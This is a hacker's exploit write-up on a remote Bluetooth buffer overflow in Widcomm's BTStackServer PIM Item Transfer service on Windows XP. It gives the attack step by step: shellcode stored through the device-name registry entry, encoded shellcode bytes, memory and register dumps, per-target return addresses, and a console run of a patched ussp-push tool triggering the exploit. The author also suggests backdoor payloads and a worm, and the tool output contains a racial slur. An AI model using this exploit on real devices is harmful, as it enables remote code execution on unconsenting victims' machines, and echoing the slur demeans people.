@@ -1,0 +1,333 @@
+have you ever been BluePIMped? 
+
+Exploiting The Widcomm BTStackServer by KF (kf_lists[at]digitalmunition[dot]com)
+  
+On August 12, 2004 Ryan Naraine of internetnews.com described a serious vulnerability in 
+Widcomm's widely deployed Bluetooth Connectivity Software. It was said that this new threat 
+could pave the way for the creation of a wireless worm that spreads between PCs or PDAs 
+using Bluetooth. (Queue scary music in the background). It is now over a year later and I 
+have yet to even see signs of an exploit, let alone a worm for either the PC or PDA. 
+<sarcasm> Consider this document as my donation of a small amount of tar to help pave the 
+road to a Widcomm Bluetooth worm.</sarcasm>
+
+First let me outline how the Widcomm Bluetooth Stack works. Upon logging in to the Windows 
+desktop the binary BTTray.exe is launched via the '..\All Users\Start Menu\Programs\Startup' 
+startup folder. BTTray is responsible for two major tasks, one being the presentation of the 
+Bluetooth icon in the systray and the other being the launch of BTStackServer.exe. BTTray.exe 
+also handles events such as informing the user that someone has connected to a particular 
+Bluetooth service. 
+
+Several profiles are offered by the 'Local Services' menu within the BTTray Bluetooth 
+Configuration screen. Several of the services require pairing prior to use, however by default 
+no secure connection is required for the PIM Item Transfer. The lack of PIM Transfer security 
+is likely due to this profile being commonly used to exchange business cards. The lack of a 
+secure connection will pretty much allow any Bluetooth user to connect to the PIM Item 
+Transfer service. 
+
+Although not explicitly disclosed one of the various malformed service requests that Pentest 
+Limited discovered was directed at the PIM Item Transfer service. As mentioned in their 
+advisory Pentest Limited has written a proof of concept exploit for Windows XP and again 
+although not explicitly disclosed this exploit was for the PIM Item Transfer service. After 
+many months of frustration and hurdles I have come up with a fairly stable means of blindly
+recreating the work of Pentest Limited.
+
+My early work on this project attempted to use a single Unicode encoded buffer to both trigger 
+this exploit and carry its payload. This technique was completely abandonded after an off the 
+cup comment about client side Unicode made me come to my senses. One little call to 
+OBEX_CharToUnicode() can change the playing field quite a bit. 
+
+The mechanics of my current exploit are as follows: 
+1. Use the ascii buffer used for Bluetooth device name to store shellcode. We have up to 248 
+   bytes. 
+2. Populate HKLM\SOFTWARE\Widcomm\BTConfig\Devices\XX:XX:XX:XX:XX:XX\Name on remote device with 
+   shellcode
+3. Make use of the remote filename field to trigger the overflow and to hold the repeated 
+   return addresses
+4. Deliver a payload of goodies for all to enjoy. 
+
+The first phase of the exploit ensures that we have shellcode in memory at the time we activate 
+the EIP address. This is done by sending a valid file via PIM Transfer. When a connection is made 
+the registry is queried for the device name. If this name exists it will be used in the 
+notification balloon that indicates a connection was made. If no registry entry is available 
+<No Name> will be used and a query to resolve the name will be placed. 
+
+This portion of the population phase can be recognised by the following message. 
+Bluetooth device '<No Name>' is connected to the 'PIM Item Transfer' service on this computer. 
+
+At this point as mentioned above a call has been made to resolve the Bluetooth name of the remote 
+device that connected to the PIM Transer service. Once this call has been completed the name will 
+be stored in the registry location shown below. Upon subsequent connections this entry will be 
+displayed in the notification balloon. 
+
+Below is an example of MsgBox shellcode from Skylined encoded via ShikataGaNai as it is stored in 
+the registry after a name resolution. 
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Widcomm\BTConfig\Devices\00:11:b1:07:be:a7]
+"Name"=hex:2b,c9,da,cd,d9,74,24,f4,5f,b1,33,b8,d1,f7,19,b7,31,47,15,83,c7,04,\
+  03,96,e6,fb,42,e4,38,3c,c8,9f,7b,8c,9a,df,77,67,ec,c3,2a,fc,65,f3,5c,6f,1a,\
+  03,9d,07,d1,31,b3,b3,7d,40,b8,5e,0c,fe,85,d0,57,16,07,fa,ce,e6,f8,fb,67,09,\
+  71,3e,46,07,d0,29,af,a7,d5,a9,f3,e6,81,fa,c9,e8,c1,d8,2d,e8,11,62,62,a4,31,\
+  3d,35,61,60,9d,8b,c5,d1,98,5f,9a,96,76,28,04,68,25,ed,64,28,8c,a1,2b,e2,49,\
+  1a,e7,b5,75,0f,54,64,76,fd,e1,9a,7a,c8,ef,b3,8c,ca,0f,44,a2,0a,5f,cd,39,31,\
+  36,d0,83,7c,20,ea,03,81,b0,bd,54,0a,f5,7d,d0,58,f0,05,e7,8a,a8,7e,b5,6a,4d,\
+  6b,0b,ab,7c,a2,2d,a0,4a,be,af,58,83,41,6e,6b,f0,11,70,b3,73,a9,06,cd,42,f5,\
+  9c,db,ee,82,05,38,0f,7e,df,cb,03,cb,ab,96,07,ca,40,ad,33,47,97,5a,64,09,67,\
+  7a,9a,00
+
+Next a secondary connection is made in order to actually trigger the overflow. This connection 
+consists of our desired return address repeated over and over being cramed into the remote file 
+name buffer. During the study of different exploitation attempts I found that my return address 
+was not often alligned as I expected or in the location that I expected. I found that repeating it 
+over and over helped stabilize my attempts. Deciding upon a static length for the filename also 
+seemed to help keep things alligned properly. The initial 272 bytes I send as a repeated return 
+address seems to be duplicated several times in succession in memory. The EIP seemes to be chosen 
+semi randomly from the area below represented in the block of memory between 0x0053C9F7 and 
+0x0053CCF7.
+
+
+0053C9A7  00 00 00 00 00 00 43 00 3A 00 5C 00 44 00 4F 00  ......C.:.\.D.O.
+0053C9B7  43 00 55 00 4D 00 45 00 7E 00 31 00 5C 00 41 00  C.U.M.E.~.1.\.A.
+0053C9C7  44 00 4D 00 49 00 4E 00 49 00 7E 00 31 00 5C 00  D.M.I.N.I.~.1.\.
+0053C9D7  4C 00 4F 00 43 00 41 00 4C 00 53 00 7E 00 31 00  L.O.C.A.L.S.~.1.
+0053C9E7  5C 00 54 00 65 00 6D 00 70 00 5C 00 41 5A 43 42  \.T.e.m.p.\.AZCB
+0053C9F7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA07  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA17  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA27  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA37  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA47  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA57  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA67  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA77  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA87  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CA97  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CAA7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CAB7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CAC7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CAD7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CAE7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CAF7  41 44 43 42 41 44 43 42 41 44 43 42 FF 44 5A 07  ADCBADCBADCBÿDZ
+0053CB07  41 5A 43 42 41 44 43 42 41 44 43 42 41 44 43 42  AZCBADCBADCBADCB
+0053CB17  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CB27  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CB37  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CB47  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CB57  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CB67  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CB77  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CB87  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CB97  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CBA7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CBB7  41 5A 43 42 41 44 43 42 41 44 43 42 41 44 43 42  AZCBADCBADCBADCB
+0053CBC7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CBD7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CBE7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CBF7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC07  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC17  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC27  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC37  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC47  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC57  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC67  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC77  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC87  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CC97  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CCA7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CCB7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CCC7  FF 44 5A 07 41 5A 43 42 41 44 43 42 41 44 43 42  ÿDZAZCBADCBADCB
+0053CCD7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CCE7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+0053CCF7  41 44 43 42 41 44 43 42 41 44 43 42 41 44 43 42  ADCBADCBADCBADCB
+
+Please note that some of the bytes were corrupted above. In some cases 0x07 and 0xff randomly 
+overwrote portions of our string. This would obviously corrupt any shellcode that was put into 
+this buffer. After I stopped trying to cram shellcode here I found that on occasion this also 
+caused undesired return addresses to be used rather than the one I specified. The letter "Z" is 
+in some cases prepended to our buffer to help compensate for the corruption. 
+
+Once the return address has been stabilized things should look similar to the following upon 
+EIP activation. 
+
+EAX 00000004
+ECX 00008000
+EDX 00000036
+EBX 0038F6E8 ASCII "0"
+ESP 01F7FF3C
+EBP 01F7FF80
+ESI 0038C510 ASCII "("
+EDI 00000001
+EIP 41424344
+
+Our shellcode seems to be in several locations however only a few of them do not contain nulls. 
+Across multiple versions and service packs the shellcode consistantly lands on an address with 
+3 static bits 0x01??f74e. You can see this trend below in the targets section from my exploit. 
+The shellcode location should contain the contents of the Bluetooth device name as it was stored 
+in the registry. 
+
+With a debugger attached to BTStackServer.exe we can attempt to activate the EIP and point it at 
+our shellcode. 
+
+animosity:/home/kfinisterre/ussp-push-0.4-kf# hcitool scan
+Scanning ...
+        00:0A:3A:54:71:95       NEW-THREAT
+animosity:/home/kfinisterre/ussp-push-0.4-kf# sdptool search OPUSH 
+00:0A:3A:54:71:95
+Inquiring ...
+Searching for OPUSH on 00:0A:3A:54:71:95 ...
+Service Name: PIM Item Transfer
+Service RecHandle: 0x10004
+Service Class ID List:
+  "OBEX Object Push" (0x1105)
+Protocol Descriptor List:
+  "L2CAP" (0x0100)
+  "RFCOMM" (0x0003)
+    Channel: 3
+  "OBEX" (0x0008)
+Language Base Attr List:
+  code_ISO639: 0x656e
+  encoding:    0x6a
+  base_offset: 0x100
+Profile Descriptor List:
+  "OBEX Object Push" (0x1105)
+    Version: 0x0100
+... 
+
+animosity:/home/kfinisterre/ussp-push-0.4-kf# ./ussp-push
+BluePIMped v0.1
+Usage: ./ussp-push {DEVICE, BTADDR@BTCHAN} LFILE RFILE
+
+        DEVICE        = RFCOMM TTY device file
+        BTADDR@BTCHAN = BlueTooth address/name and OBEX channel
+        TARGET  = Target number
+Types:
+0 [0x01abf74e]: [ XP Pro SP0   - Ambicom btysb1.4.2w.zip 1.4.2 Build 10 ]
+1 [0x019bf74e]: [ XP Pro SP0   - Actiontec Bluetooth Software (ver 1.1 cd label) ]
+2 [0x019bf74e]: [ XP Pro SP0   - Belkin Bluetooth Software 1.4.2 Build 10 ]
+3 [0x0197f74e]: [ XP Pro SP1a  - Belkin Bluetooth Software 1.4.2 Build 10 ]
+4 [0x0199f74e]: [ XP Home SP1a (and Pro?) - Belkin Bluetooth Software 1.4.2 Build 10 ]
+5 [0x41424344]: [ Crash ]
+
+animosity:/home/kfinisterre/ussp-push-0.4-kf# ./ussp-push 00:0A:3A:54:71:95@3 4
+[-] Selected target:
+    4 [0x0199f74e]: [ XP Home SP1a (and Pro?) - Belkin Bluetooth Software 1.4.2 Build 10 ]
+name=/etc/hosts, size=257
+Registered transport
+
+set user data
+
+created new objext
+Local device 00:0B:0D:63:0B:CC
+Remote device 00:0A:3A:54:71:95 (3)
+
+started a new request
+reqdone
+Command (00) has now finished, rsp: 20Connected!
+
+Connection return code: 0, id: 0
+Connection established
+connected to server
+Sending file: YouAreBeingPwnedViaBlueTooth, path: /etc/hosts, size: 257
+reqdone
+Command (02) has now finished, rsp: 20reqdone
+Command (01) has now finished, rsp: 20Disconnect done!
+sleeping 3 seconds before triggering the shellcode
+name=/etc/hosts, size=257
+Registered transport
+
+set user data
+
+created new objext
+Local device 00:0B:0D:63:0B:CC
+Remote device 00:0A:3A:54:71:95 (3)
+
+started a new request
+reqdone
+Command (00) has now finished, rsp: 20Connected!
+
+Connection return code: 0, id: 0
+Connection established
+connected to server
+Sending file: 
+ZZZ÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N
+÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷
+N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N÷N, 
+path: /etc/hosts, size: 257
+Made some progress...
+Peace nigga...
+
+After the malformed request is sent my debugger paused with an Access violation when writing to 
+[00713000]. You can safely pass this exception on to the program. This is a good time to verify 
+that your shellcode is where you expect it to be. 
+
+0199F74E  2B C9 DA CD D9 74 24 F4 5F B1 33 B8 D1 F7 19 B7  +ÉÚÍÙt$ô_±3¸Ñ÷·
+0199F75E  31 47 15 83 C7 04 03 96 E6 FB 42 E4 38 3C C8 9F  1GƒÇ–æûBä8<ÈŸ
+0199F76E  7B 8C 9A DF 77 67 EC C3 2A FC 65 F3 5C 6F 1A 03  {ŒšßwgìÃ*üeó\o
+0199F77E  9D 07 D1 31 B3 B3 7D 40 B8 5E 0C FE 85 D0 57 16  Ñ1³³}@¸^.ş…ĞW
+0199F78E  07 FA CE E6 F8 FB 67 09 71 3E 46 07 D0 29 AF A7  úÎæøûg.q>FĞ)¯§
+0199F79E  D5 A9 F3 E6 81 FA C9 E8 C1 D8 2D E8 11 62 62 A4  Õ©óæúÉèÁØ-èbb¤
+0199F7AE  31 3D 35 61 60 9D 8B C5 D1 98 5F 9A 96 76 28 04  1=5a`‹ÅÑ˜_š–v(
+0199F7BE  68 25 ED 64 28 8C A1 2B E2 49 1A E7 B5 75 0F 54  h%íd(Œ¡+âIçµuT
+0199F7CE  64 76 FD E1 9A 7A C8 EF B3 8C CA 0F 44 A2 0A 5F  dvıášzÈï³ŒÊD¢._
+0199F7DE  CD 39 31 36 D0 83 7C 20 EA 03 81 B0 BD 54 0A F5  Í916Ğƒ| ê°½T.õ
+0199F7EE  7D D0 58 F0 05 E7 8A A8 7E B5 6A 4D 6B 0B AB 7C  }ĞXğçŠ¨~µjMk«|
+0199F7FE  A2 2D A0 4A BE AF 58 83 41 6E 6B F0 11 70 B3 73  ¢- J¾¯XƒAnkğp³s
+0199F80E  A9 06 CD 42 F5 9C DB EE 82 05 38 0F 7E DF CB 03  ©ÍBõœÛî‚8~ßË
+0199F81E  CB AB 96 07 CA 40 AD 33 47 97 5A 64 09 67 7A 9A  Ë«–Ê@­3G—Zd.gzš
+
+Immediately after passing the exception control should be handed over to us. We should jump into 
+the code we stored in the Bluetooth name buffer. Skylined's code will to do its magic and the real 
+intent of our payload is revealed. 
+
+0199F74E  2B C9 DA CD D9 74 24 F4 5F B1 33 B8 D1 F7 19 B7  +ÉÚÍÙt$ô_±3¸Ñ÷·
+0199F75E  31 47 15 83 C7 04 03 47 11 E2 F5 FC 31 C0 64 8B  1GƒÇGâõü1Àd‹
+0199F76E  40 30 8B 40 0C 8B 70 1C AD 8B 68 08 68 6C 6C 00  @0‹@.‹p­‹hhll.
+0199F77E  00 68 33 32 2E 64 68 75 73 65 72 54 BB 71 A7 E8  .h32.dhuserT»q§è
+0199F78E  FE E8 56 00 00 00 89 EF 89 C5 31 D2 52 E8 06 00  şèV...‰ï‰Å1ÒRè.
+0199F79E  00 00 43 41 54 53 3A 00 E8 25 00 00 00 41 4C 4C  ..CATS:.è%...ALL
+0199F7AE  20 59 4F 55 52 20 42 4C 55 45 54 4F 4F 54 48 20   YOUR BLUETOOTH
+0199F7BE  41 52 45 20 42 45 4C 4F 4E 47 20 54 4F 20 55 53  ARE BELONG TO US
+0199F7CE  2E 00 52 BB E2 0C C9 FA E8 0F 00 00 00 31 C0 50  ..R»â.Éúè...1ÀP
+0199F7DE  89 FD BB 69 1D 42 3A E8 00 00 00 00 56 57 8B 45  ‰ı»iB:è....VW‹E
+0199F7EE  3C 8B 54 05 78 01 EA 52 8B 52 20 01 EA 31 C0 31  <‹TxêR‹R ê1À1
+0199F7FE  C9 41 8B 34 8A 01 EE 31 FF C1 CF 13 AC 01 C7 85  ÉA‹4Šî1ÿÁÏ¬Ç…
+0199F80E  C0 75 F6 39 DF 75 EA 5A 8B 5A 24 01 EB 66 8B 0C  Àuö9ßuêZ‹Z$ëf‹.
+0199F81E  4B 8B 5A 1C 01 EB 8B 04 8B 01 E8 5F 5E FF E0 00  K‹Zë‹‹è_^ÿà.
+
+At this point the user of the machine should be greeted with a nice message box window titled 
+"CATS:" with the message "ALL YOUR BLUETOOTH ARE BELONG TO US.". Obviously any payload can be 
+plugged into the exploit keeping in mind space limitations of the various buffers. 
+
+In an ideal situation the initial phase that places the shellcode in the registry should be 
+used as an chance to upload a binary with some sort of backdoor functionality as well as a 
+scripted procedure to kill BTTray and restart it. Any uploaded binary would reside in 
+"%USERPROFILE%"\mydocu~1\blueto~1 by default so shellcode that can resolve that path and execute 
+a binary there would be very useful (hint hint email me some shellcode if anyone is bored).
+
+I have toyed around with payloads that flip a few bits in SOFTWARE\Widcomm\BTConfig\Services\\000?, 
+SOFTWARE\Widcomm\General\UseFixedPIN and SOFTWARE\Widcomm\General\PinCode. However I have not yet 
+come upon a payload that would be as functional as %USERPROFILE% execution code. 
+
+I hope this document will help clear up some of the myths about the potential wormability of the 
+Widcomm Bluetooth bugs. I also hope that Vendors that still distribute dongles with vulnerable 
+software will step up to the plate and help eliminate this threat. Vendors...please put an end to 
+the license.dat issues that prevent so many users from upgrading their Widcomm software. 
+
+Please see the proof of concept patch to ussp-push-0.4 published at 
+http://www.digitalmunition.com/BluePIMped.diff
+
+kfinisterre@animosity:~$ tar -zxvf ussp-push-0.4.tar.gz
+ussp-push-0.4/
+ussp-push-0.4/COPYING
+ussp-push-0.4/Makefile
+ussp-push-0.4/doc/
+ussp-push-0.4/doc/README
+ussp-push-0.4/doc/ussp-push.html
+ussp-push-0.4/obex_main.c
+ussp-push-0.4/obex_socket.c
+ussp-push-0.4/obex_socket.h
+kfinisterre@animosity:~$ cat BluePIMped.diff | patch -p0
+patching file ussp-push-0.4/obex_main.c
+
+-KF
+
